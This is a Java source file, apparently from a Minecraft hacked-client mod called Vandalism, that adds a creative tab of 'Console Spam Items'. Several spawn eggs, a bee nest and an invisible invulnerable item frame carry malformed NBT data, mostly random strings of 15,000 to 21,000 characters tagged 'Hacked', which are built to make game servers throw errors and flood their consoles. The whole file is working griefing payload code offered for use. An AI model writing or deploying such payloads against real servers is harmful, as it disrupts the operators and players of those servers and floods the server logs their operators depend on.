/*
 * This file is part of Vandalism - https://github.com/NekosAreKawaii/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, FooFieOwO, Recyz and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.creativetab.impl;

import de.nekosarekawaii.vandalism.feature.creativetab.AbstractCreativeTab;
import net.minecraft.block.Blocks;
import net.minecraft.block.entity.BeehiveBlockEntity;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtString;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import org.apache.commons.lang3.RandomStringUtils;

import java.util.ArrayList;
import java.util.List;

import static de.nekosarekawaii.vandalism.util.ItemStackUtil.withClientSide;

public class ConsoleSpamItemsCreativeTab extends AbstractCreativeTab {

    public ConsoleSpamItemsCreativeTab() {
        super(Text.literal("Console Spam Items"), Items.SPECTRAL_ARROW);
    }

    @Override
    public void exposeItems(final List<ItemStack> items) {
        items.add(withClientSide(createServerConsoleErrorArrow(), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Server Console Error Arrow")));
        items.add(withClientSide(createServerConsoleErrorBat(), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Server Console Error Bat")));
        items.add(withClientSide(createServerConsoleSpamArrow(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Server Console Spam Arrow")));
        items.add(withClientSide(createServerConsoleSpamArea(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Server Console Spam Area")));
        items.add(withClientSide(createServerConsoleSpamBeeNest(), Text.literal(Formatting.RED + Formatting.BOLD.toString() + "Server Console Spam Bee Nest")));
        items.add(withClientSide(createServerConsoleSpamDisplay(), Text.literal(Formatting.GOLD + Formatting.BOLD.toString() + "Server Console Spam Display")));
        items.add(withClientSide(createServerConsoleSpamFrame(), Text.literal(Formatting.GOLD + Formatting.BOLD.toString() + "Server Console Spam Frame")));
    }

    private static ItemStack createServerConsoleErrorArrow() {
        final ItemStack item = new ItemStack(Items.HORSE_SPAWN_EGG);
        final NbtCompound entityData = new NbtCompound();
        entityData.putString("id", "minecraft:arrow");
        entityData.putByte("pickup", (byte) 3);
        entityData.putShort("life", (short) 1200);
        item.set(DataComponentTypes.ENTITY_DATA, NbtComponent.of(entityData));
        return item;
    }

    private static ItemStack createServerConsoleErrorBat() {
        final ItemStack item = new ItemStack(Items.BAT_SPAWN_EGG);
        final NbtCompound entityData = new NbtCompound();
        entityData.putString("id", "minecraft:bat");
        entityData.putShort("Fire", (short) 100);
        entityData.putFloat("Health", 1f);
        entityData.putString("DeathLootTable", "\"\"");
        item.set(DataComponentTypes.ENTITY_DATA, NbtComponent.of(entityData));
        return item;
    }

    private static ItemStack createServerConsoleSpamArrow() {
        final ItemStack item = new ItemStack(Items.SHEEP_SPAWN_EGG);
        final NbtCompound entityData = new NbtCompound();
        entityData.putString("id", "minecraft:arrow");
        entityData.putShort("life", (short) 1200);
        entityData.putString("SoundEvent", "Hacked:" + RandomStringUtils.random(21000));
        item.set(DataComponentTypes.ENTITY_DATA, NbtComponent.of(entityData));
        return item;
    }

    private static ItemStack createServerConsoleSpamArea() {
        final ItemStack item = new ItemStack(Items.COW_SPAWN_EGG);
        final NbtCompound entityData = new NbtCompound();
        final NbtCompound particle = new NbtCompound();
        particle.putString("type", "hacked:6:9" + RandomStringUtils.random(15000));
        entityData.put("Particle", particle);
        entityData.putFloat("Radius", 0f);
        entityData.putString("id", "minecraft:area_effect_cloud");
        item.set(DataComponentTypes.ENTITY_DATA, NbtComponent.of(entityData));
        return item;
    }

    private static ItemStack createServerConsoleSpamBeeNest() {
        final ItemStack item = new ItemStack(Blocks.BEE_NEST);
        final NbtCompound blockEntityData = new NbtCompound();
        blockEntityData.putString("id", "minecraft:bee_nest");
        final List<BeehiveBlockEntity.BeeData> bees = new ArrayList<>();
        final NbtCompound beeData = new NbtCompound();
        beeData.putString("id", "Hacked:" + RandomStringUtils.random(15000));
        bees.add(new BeehiveBlockEntity.BeeData(NbtComponent.of(beeData), 0, 0));
        item.set(DataComponentTypes.BEES, bees);
        return item;
    }

    private static ItemStack createServerConsoleSpamDisplay() {
        final ItemStack item = new ItemStack(Items.CHICKEN_SPAWN_EGG);
        final NbtCompound entityData = new NbtCompound();
        entityData.putString("id", "minecraft:text_display");
        entityData.put("transformation", NbtString.of(RandomStringUtils.random(15000)));
        item.set(DataComponentTypes.ENTITY_DATA, NbtComponent.of(entityData));
        return item;
    }

    private static ItemStack createServerConsoleSpamFrame() {
        final ItemStack item = new ItemStack(Items.ITEM_FRAME);
        final NbtCompound entityData = new NbtCompound();
        entityData.putString("id", "minecraft:item_frame");
        entityData.putByte("Fixed", (byte) 1);
        entityData.putByte("Invisible", (byte) 1);
        entityData.putByte("Silent", (byte) 1);
        entityData.putByte("Invulnerable", (byte) 1);
        final NbtCompound itemData = new NbtCompound();
        itemData.putString("id", RandomStringUtils.random(15000));
        entityData.put("Item", itemData);
        item.set(DataComponentTypes.ENTITY_DATA, NbtComponent.of(entityData));
        return item;
    }

}
